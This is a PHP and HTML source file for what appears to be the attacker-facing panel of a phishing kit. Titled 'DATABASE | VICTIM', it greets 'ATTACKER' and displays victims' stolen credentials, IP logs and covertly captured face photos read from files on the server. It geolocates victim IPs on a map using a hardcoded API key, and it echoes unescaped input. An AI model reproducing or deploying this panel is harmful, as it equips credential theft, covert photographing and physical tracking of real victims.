<?php


require_once '../session_manager.php';

if(!isLogin()){
   header('Location: login.php');
   echo "You need to login Key!!";
}


// Define the directory path
// Define the directory path

if(isset($_POST['submit'])){
  
$ip_address = $_POST['ip_address'];
// Send a GET request to the IP Geolocation API


$response = file_get_contents('https://ipgeolocation.abstractapi.com/v1/?api_key=3ecd3e866cf5458194d515f1f74ee555&ip_address='.$ip_address);
$data = json_decode($response, true);


$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Extracting device information from the user agent string

}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <meta charset="utf-8">

         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css">
  <link rel="stylesheet"  href="https://fonts.googleapis.com/css?family=Montserrat&display=swap">
   <!-- <script src='https://www.google.com/recaptcha/api.js'></script>-->


  <title>DATABASE | VICTIM</title>
  <style>
    @keyframes move {
    100% {
        transform: translate3d(0, 0, 1px) rotate(360deg);
    }
}

.background {
    position: fixed;
    width: 100vw;
    height: 100vh;
    top: 0;
    left: 0;
    background: #000000;
    overflow: hidden;
}

.background span {
    width: 5vmin;
    height: 5vmin;
    border-radius: 5vmin;
    backface-visibility: hidden;
    position: absolute;
    animation: move;
    animation-duration: 50;
    animation-timing-function: linear;
    animation-iteration-count: infinite;
}


.background span:nth-child(0) {
    color: #ff0000;
    top: 89%;
    left: 34%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 12vw -4vh;
    box-shadow: -10vmin 0 1.9368007764658615vmin currentColor;
}
.background span:nth-child(1) {
    color: #ff0000;
    top: 96%;
    left: 46%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -10vw -19vh;
    box-shadow: -10vmin 0 1.298220677149239vmin currentColor;
}
.background span:nth-child(2) {
    color: #00ff00;
    top: 96%;
    left: 23%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 17vw -12vh;
    box-shadow: -10vmin 0 1.3496968221173389vmin currentColor;
}
.background span:nth-child(3) {
    color: #00ff00;
    top: 41%;
    left: 96%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 23vw -3vh;
    box-shadow: 10vmin 0 1.8419909515138204vmin currentColor;
}
.background span:nth-child(4) {
    color: #ff0000;
    top: 79%;
    left: 35%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 2vw -12vh;
    box-shadow: -10vmin 0 1.703806491424774vmin currentColor;
}
.background span:nth-child(5) {
    color: #00ff00;
    top: 2%;
    left: 39%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -6vw -9vh;
    box-shadow: 10vmin 0 1.331656483139871vmin currentColor;
}
.background span:nth-child(6) {
    color: #ff0000;
    top: 73%;
    left: 44%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -10vw 25vh;
    box-shadow: 10vmin 0 2.0245861346284215vmin currentColor;
}
.background span:nth-child(7) {
    color: #ff0000;
    top: 49%;
    left: 10%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 24vw -11vh;
    box-shadow: 10vmin 0 2.0289899701611596vmin currentColor;
}
.background span:nth-child(8) {
    color: #ff0000;
    top: 41%;
    left: 88%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -23vw -1vh;
    box-shadow: -10vmin 0 1.798426031737954vmin currentColor;
}
.background span:nth-child(9) {
    color: #ff0000;
    top: 11%;
    left: 7%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -21vw 17vh;
    box-shadow: -10vmin 0 1.586564134565788vmin currentColor;
}
.background span:nth-child(10) {
    color: #00ff00;
    top: 34%;
    left: 28%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 8vw 6vh;
    box-shadow: -10vmin 0 1.6263840644792769vmin currentColor;
}
.background span:nth-child(11) {
    color: #ff0000;
    top: 90%;
    left: 18%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 10vw -3vh;
    box-shadow: 10vmin 0 1.9230670240081291vmin currentColor;
}
.background span:nth-child(12) {
    color: #ff0000;
    top: 12%;
    left: 22%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -11vw 14vh;
    box-shadow: 10vmin 0 1.7328317154809805vmin currentColor;
}
.background span:nth-child(13) {
    color: #ff0000;
    top: 84%;
    left: 46%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 16vw 14vh;
    box-shadow: 10vmin 0 1.5429802244065087vmin currentColor;
}
.background span:nth-child(14) {
    color: #ff0000;
    top: 25%;
    left: 66%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 8vw -6vh;
    box-shadow: 10vmin 0 1.854572228482214vmin currentColor;
}
.background span:nth-child(15) {
    color: #00ff00;
    top: 100%;
    left: 19%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -2vw -9vh;
    box-shadow: 10vmin 0 1.9590589484747232vmin currentColor;
}
.background span:nth-child(16) {
    color: #00ff00;
    top: 18%;
    left: 16%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 10vw 21vh;
    box-shadow: 10vmin 0 2.2296939650658247vmin currentColor;
}
.background span:nth-child(17) {
    color: #ff0000;
    top: 28%;
    left: 23%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -11vw -9vh;
    box-shadow: 10vmin 0 1.8140804291688417vmin currentColor;
}
.background span:nth-child(18) {
    color: #ff0000;
    top: 60%;
    left: 42%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -15vw -22vh;
    box-shadow: -10vmin 0 2.066411623631822vmin currentColor;
}
.background span:nth-child(19) {
    color: #ff0000;
    top: 22%;
    left: 79%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 24vw 22vh;
    box-shadow: 10vmin 0 1.9283070138039031vmin currentColor;
}
.background span:nth-child(20) {
    color: #00ff00;
    top: 85%;
    left: 13%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 12vw 2vh;
    box-shadow: 10vmin 0 1.8191462314671174vmin currentColor;
}
.background span:nth-child(21) {
    color: #ff0000;
    top: 3%;
    left: 36%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 25vw 25vh;
    box-shadow: -10vmin 0 1.2729386116645993vmin currentColor;
}
.background span:nth-child(22) {
    color: #ff0000;
    top: 58%;
    left: 78%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 13vw -5vh;
    box-shadow: -10vmin 0 2.1606345417002824vmin currentColor;
}
.background span:nth-child(23) {
    color: #ff0000;
    top: 86%;
    left: 75%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -15vw -10vh;
    box-shadow: 10vmin 0 1.876248579922797vmin currentColor;
}
.background span:nth-child(24) {
    color: #ff0000;
    top: 26%;
    left: 21%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 16vw 18vh;
    box-shadow: -10vmin 0 2.1682290896077556vmin currentColor;
}
.background span:nth-child(25) {
    color: #ff0000;
    top: 13%;
    left: 96%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 11vw 10vh;
    box-shadow: 10vmin 0 2.2491537490179345vmin currentColor;
}
.background span:nth-child(26) {
    color: #00ff00;
    top: 62%;
    left: 34%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: 15vw -6vh;
    box-shadow: 10vmin 0 2.1230878193640415vmin currentColor;
}
.background span:nth-child(27) {
    color: #ff0000;
    top: 52%;
    left: 24%;
    animation-duration: 6s;
    animation-delay: -1s;
    transform-origin: -9vw 24vh;
    box-shadow: -10vmin 0 2.026469759509931vmin currentColor;
}

    body{
      height:1600px;
      background-color:black;
    
      font-family: "Montserrat", sans-serif;
      text-align: center;
      align-items: center;
    }
    .rainbow {
  text-align: center;
  font-weight:bold;
  font-size: 24px;
 
  letter-spacing: 2px;
  animation: colorRotate 1s linear 0s infinite;
}

@keyframes colorRotate {
  from {
    color: #6666ff;
  }
  10% {
    color: #0099ff;
  }
  50% {
    color: #00ff00;
  }
  75% {
    color: #ff3399;
  }
  100% {
    color: #6666ff;
  }
}
.header{
  background-color:#0D0D0D;
}
.scrollbox{
  border-collapse: collapse; 
background-color:#0D0D0D;
            border-spacing: 0; 
  overflow-y:scroll;
  display:block;
  
}

  /* width */         

        ::-webkit-scrollbar { 

            width: 10px; 

        } 

  

        /* Track */ 

        ::-webkit-scrollbar-track { 

            background: black; 

        } 

  

        /* Handle */ 

        ::-webkit-scrollbar-thumb { 

            background: lime; 

        } 

  

        /* Handle on hover */ 

        ::-webkit-scrollbar-thumb:hover { 

            background: red; 

        } 

          
  </style>
  
  
  </head>
  <body>
    
<div class="background">


    <center>
   
  <img src="https://i.ibb.co/VSJzFbh/FB-IMG-17042731143224778-removebg-preview.png" width="300px" style="border-radius: 50%">
    <br>
    
          <h3 style='color:red;  font-weight:bold;font-size:24px;  font-family:monaco; '>
      <?php
    // File path
    $file = "../ip.txt";
    
    // Check if the file exists
    if (file_exists($file)) {
        // Read the file content
        $content = file_get_contents($file);
        
        // Display the content
        echo nl2br($content);
    } else {
        echo "Victim Not Found!";
    }
    
?>
</h3>


      <h1 style="font-size:50px; color:lime; text-shadow:3px lime;">WELCOME ATTACKER </h1>

      
      <br>
    <br>
    
    <div class="content">
  <h3 class="rainbow" style="font-weight:bold; border:2px solid lime; width:660px;"> 💳 CREDENTIALS  </h3>
      
      
    <div class="scrollbox" style="border:2px solid lime; width:660px; height:300px; border-radius: 9px; ">
      
      
      <br>
     
<br>
      <p style='color:red;  font-size:24px;  font-family:monaco; '>
      <?php
    // File path
    $file = "../credentials.txt";
    
    // Check if the file exists
    if (file_exists($file)) {
        // Read the file content
        $content = file_get_contents($file);
        
        // Display the content
        echo nl2br($content);
    } else {
        echo "Victim Not Found!";
    }
    
?>
</p>


    </div>
    
    
    
    
    <br><br>
      <h3 class="rainbow" style="font-weight:bold; border:2px solid lime; width:660px;">  👨 VICTIM CAPTURED FACE </h3>

    <div class="scrollbox" style="border:2px solid lime; width:660px; height:300px; border-radius: 0px;  ">
           <br>
       
           

                   <?php
                     $directory = "../image/"; // Replace with the actual directory path
                     $files = scandir($directory);
                     
                     foreach ($files as $file) {
                         if ($file !== '.' && $file !== '..') {
                           echo "
                        <img src='../image/$file'>

                          ";
                         }
                         
                     
                    
                     }
                     

                     ?>
        
     
         </div>
        

         </div>
             <br><br>
      <h3 class="rainbow" style="font-weight:bold; border:2px solid lime; width:660px;">🌏  LOCATION INFORMATION </h3>
             <div class="scrollbox" style="border:2px solid lime; width:660px; height:300px; border-radius: 9px; ; ">
      <br>
      <form action="" method="POST">
  <input type="text" style="height:40px; width:600px;border:2px solid lime ;background-color: transparent;border-radius: 4px;  color:red;" name="ip_address" placeholder="ENTER IP ADDRESS">&nbsp;<br><br>
  <input type="submit" style=" width:180px;border-radius: 4px;  border:2px solid lime ;background-color: transparent; color:red;" name="submit" value="SCAN">
  </form>
  <br><br>
     
      
      
      
       <a class="a"> <?php 
       
       echo "</p>";
echo "<p  style='margin:0px;color:lime;'> Continent : &nbsp;";
              echo  $data["continent"]; 
              echo "</p>";
       echo "<p  style='margin:0px;color:lime;'> Country : &nbsp;";
       echo  $data["country"]; 
       echo "</p>";
       echo "<p style='margin:0px;color:lime;'> City : &nbsp;";
       echo  $data["city"]; 
       echo "</p>";
       echo "<p style='margin:0px;color:lime;'> Ip : &nbsp;";
       echo  $data["ip_address"]; 
       echo "</p>";
       echo "<p style='margin:0px;color:lime;'> Latitude : &nbsp;";
       echo  $data["latitude"]; 
       echo "</p>";
       echo "<p style='margin:0px;color:lime;'> Longitude : &nbsp;";
              echo  $data["longitude"]; 
              echo "</p>";
              
        $lat = $data["latitude"];     
        $lon = $data["longitude"];
              echo '<br><br><iframe style="border:3px solid lime; border-radius: 4px; width:630px; height:310px;" src="https://www.openstreetmap.org/export/embed.html?bbox=' . ($lon - 0.00) . ',' . ($lat - 0.001) . ',' . ($lon + 0.001) . ',' . ($lat + 0.001) . '&amp;layer=mapnik"></iframe>';
              
              
       ?>
       <br>
              <br>       <br>
       </span></la>
     
     
      
         <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>

             
   

    </div>

    </center>
    </div>
  </body>
  </html>